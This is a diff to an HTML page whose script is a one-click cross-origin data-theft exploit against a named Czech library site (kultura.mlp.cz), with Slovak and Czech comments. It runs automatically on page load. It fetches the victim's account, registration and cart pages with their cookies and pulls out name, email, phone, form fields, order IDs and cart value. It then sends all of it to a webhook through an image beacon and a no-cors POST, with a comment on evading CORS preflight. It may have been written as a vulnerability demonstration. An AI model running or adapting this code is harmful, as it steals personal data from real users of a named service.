@@ -25,94 +25,151 @@ h1{color:#1a5276}
 
 <script>
 // ══════════════════════════════════════════════════════════
-// KONFIGURÁCIA — nastav pred deployom:
-const WEBHOOK = "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1";  // https://webhook.site/tvoj-uuid
+// KONFIGURÁCIA:
+const WEBHOOK = "WEBHOOK_URL_SEM";
 // ══════════════════════════════════════════════════════════
 
-const TARGET = "https://kultura.mlp.cz";
+const T = "https://kultura.mlp.cz";
+
+function ex(html, patterns) {
+    for (const p of patterns) {
+        const m = html.match(p);
+        if (m && m[1] && m[1].trim()) return m[1].trim();
+    }
+    return "";
+}
 
 async function steal() {
     const status = document.getElementById("status");
     const result = document.getElementById("result");
     const spinner = document.getElementById("spinner");
-    
+
     const stolen = {
         timestamp: new Date().toISOString(),
-        attacker_origin: window.location.origin,
-        victim_data: {}
+        origin: window.location.origin,
+        data: {}
     };
 
     try {
-        // 1. Profil
+        // 1. Registration page
         status.textContent = "Ověřování účtu...";
-        const r1 = await fetch(TARGET + "/mkp/General/MyAccount/Registration", {credentials: "include"});
-        const html1 = await r1.text();
+        const r1 = await fetch(T + "/mkp/General/MyAccount/Registration", {credentials: "include"});
+        const h1 = await r1.text();
 
-        const fields = {
-            jmeno:    html1.match(/inputName"[^>]*value="([^"]*)"/) ,
-            prijmeni: html1.match(/inputSurname"[^>]*value="([^"]*)"/),
-            email:    html1.match(/registrationEmail"[^>]*value="([^"]*)"/),
-            telefon:  html1.match(/inputPhone"[^>]*value="([^"]*)"/),
-        };
-        const nav = html1.match(/login__user-name[^>]*>\s*([^<]+)/);
-        const emails = html1.match(/[\w.-]+@[\w.-]+\.\w+/g);
+        // Email — hľadáme v rôznych miestach
+        stolen.data.email = ex(h1, [
+            /registrationEmail"[^>]*value="([^"]+)"/,
+            /name="Email"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*name="Email"/,
+            /value="([^"]*)"[^>]*id="registrationEmail"/,
+        ]);
 
-        stolen.victim_data.logged_as = nav ? nav[1].trim() : "";
-        for (const [k, m] of Object.entries(fields)) {
-            stolen.victim_data[k] = m ? m[1] : "";
-        }
-        stolen.victim_data.emails_found = emails ? [...new Set(emails)] : [];
-        stolen.victim_data.profile_size = html1.length;
+        // Meno — z value alebo z iných patterns
+        stolen.data.jmeno = ex(h1, [
+            /name="FirstName"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*name="FirstName"/,
+            /inputName"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*id="inputName"/,
+        ]);
 
-        // 2. Objednávky
+        stolen.data.prijmeni = ex(h1, [
+            /name="Surname"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*name="Surname"/,
+            /inputSurname"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*id="inputSurname"/,
+        ]);
+
+        stolen.data.telefon = ex(h1, [
+            /name="PhoneNumber"[^>]*value="([^"]+)"/,
+            /value="([^"]*)"[^>]*name="PhoneNumber"/,
+            /inputPhone"[^>]*value="([^"]+)"/,
+        ]);
+
+        // Všetky emaily na stránke
+        const emails = [...new Set((h1.match(/[\w.-]+@[\w.-]+\.\w{2,}/g) || []))];
+        if (!stolen.data.email && emails.length) stolen.data.email = emails[0];
+        stolen.data.all_emails = emails;
+
+        // Skúsime nájsť dáta v hidden inputoch a JS
+        const allValues = [...h1.matchAll(/name="([^"]+)"[^>]*value="([^"]+)"/g)];
+        const allValues2 = [...h1.matchAll(/value="([^"]+)"[^>]*name="([^"]+)"/g)];
+        const formData = {};
+        allValues.forEach(m => { if(m[2].length > 0 && m[2].length < 100) formData[m[1]] = m[2]; });
+        allValues2.forEach(m => { if(m[1].length > 0 && m[1].length < 100) formData[m[2]] = m[1]; });
+        stolen.data.all_form_fields = formData;
+
+        // 2. MyAccount — objednávky
         status.textContent = "Načítání objednávek...";
-        const r2 = await fetch(TARGET + "/mkp/General/MyAccount?mrsid=1", {credentials: "include"});
-        const html2 = await r2.text();
-        const orders = [...new Set([...html2.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1]))];
-        stolen.victim_data.order_ids = orders;
+        const r2 = await fetch(T + "/mkp/General/MyAccount?mrsid=1", {credentials: "include"});
+        const h2 = await r2.text();
+
+        // Meno z navigácie
+        stolen.data.logged_as = ex(h2, [
+            /login__user-name[^>]*>\s*([^<]+)/,
+            /user-name[^>]*>\s*([^<]+)/,
+        ]);
+
+        // Objednávky
+        const orders = [...new Set([...h2.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1]))];
+        stolen.data.order_ids = orders;
+
+        // MLP check authorization data (meno v JS)
+        const jmenoJS = ex(h2, [
+            /"Jmeno"\s*:\s*"([^"]+)"/,
+            /\.Jmeno\s*[=:]\s*"([^"]+)"/,
+        ]);
+        const prijmeniJS = ex(h2, [
+            /"Prijmeni"\s*:\s*"([^"]+)"/,
+            /\.Prijmeni\s*[=:]\s*"([^"]+)"/,
+        ]);
+        const emailJS = ex(h2, [
+            /"Email"\s*:\s*"([^"]+)"/,
+            /\.Email\s*[=:]\s*"([^"]+)"/,
+        ]);
+        if (jmenoJS) stolen.data.jmeno = jmenoJS;
+        if (prijmeniJS) stolen.data.prijmeni = prijmeniJS;
+        if (emailJS && !stolen.data.email) stolen.data.email = emailJS;
 
         // 3. Košík
         status.textContent = "Načítání košíku...";
-        const r3 = await fetch(TARGET + "/mkp/standard/Cart/Index?mrsid=1", {credentials: "include"});
-        const html3 = await r3.text();
-        const total = html3.match(/value:\s*(\d+)/);
-        const tickets = [...html3.matchAll(/Cart\/Delete\/(\d+)/g)].map(m => m[1]);
-        stolen.victim_data.cart_total = total ? total[1] + " Kč" : "prázdný";
-        stolen.victim_data.cart_tickets = tickets;
+        const r3 = await fetch(T + "/mkp/standard/Cart/Index?mrsid=1", {credentials: "include"});
+        const h3 = await r3.text();
+        const total = h3.match(/value:\s*(\d+)/);
+        stolen.data.cart = total ? total[1] + " Kč" : "prázdný";
 
-        // 4. Odoslanie na webhook
-        if (WEBHOOK && WEBHOOK !== "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1") {
-            await fetch(WEBHOOK, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify(stolen),
-                mode: "no-cors"
-            });
-            stolen.exfiltrated_to = WEBHOOK;
+        // 4. Exfiltrácia na webhook
+        if (WEBHOOK && WEBHOOK !== "WEBHOOK_URL_SEM") {
+            // Image beacon (vždy funguje)
+            const p = encodeURIComponent(JSON.stringify(stolen));
+            new Image().src = WEBHOOK + "?" + p.substring(0, 2000);
+            // Fetch s text/plain (obíde CORS preflight)
+            try {
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    body: JSON.stringify(stolen, null, 2),
+                    mode: "no-cors"
+                });
+            } catch(e) {}
+            stolen._sent_to_webhook = true;
         }
 
-        // 5. Zobrazenie na stránke
+        // 5. Zobrazenie
         spinner.style.display = "none";
-        const hasData = stolen.victim_data.logged_as || stolen.victim_data.email;
-
-        if (hasData) {
-            status.innerHTML = '<span style="color:#e74c3c;font-weight:bold">⚠️ Vaše údaje byly přečteny z cizí domény!</span>';
-        } else {
-            status.innerHTML = '<span style="color:#f39c12">Session anonymní (cookie partitioning aktivní)</span>';
-        }
-
+        const hasData = stolen.data.email || stolen.data.logged_as || stolen.data.jmeno;
+        status.innerHTML = hasData
+            ? '<span style="color:#e74c3c;font-weight:bold">⚠️ Vaše údaje byly přečteny z cizí domény!</span>'
+            : '<span style="color:#f39c12">Session anonymní</span>';
         result.classList.remove("hidden");
         result.innerHTML = '<span class="tag">EXFILTROVANÁ DATA</span>\n' + JSON.stringify(stolen, null, 2);
 
     } catch (e) {
         spinner.style.display = "none";
-        status.innerHTML = '<span style="color:#27ae60">✅ CORS zablokován prohlížečem</span>';
+        status.innerHTML = '✅ CORS zablokován';
         result.classList.remove("hidden");
-        result.textContent = "Error: " + e.message;
+        result.textContent = "Blocked: " + e.message;
     }
 }
 
-// Auto-run pri načítaní stránky = ONE CLICK (návšteva stránky)
 window.addEventListener("load", steal);
 </script>
 </body>
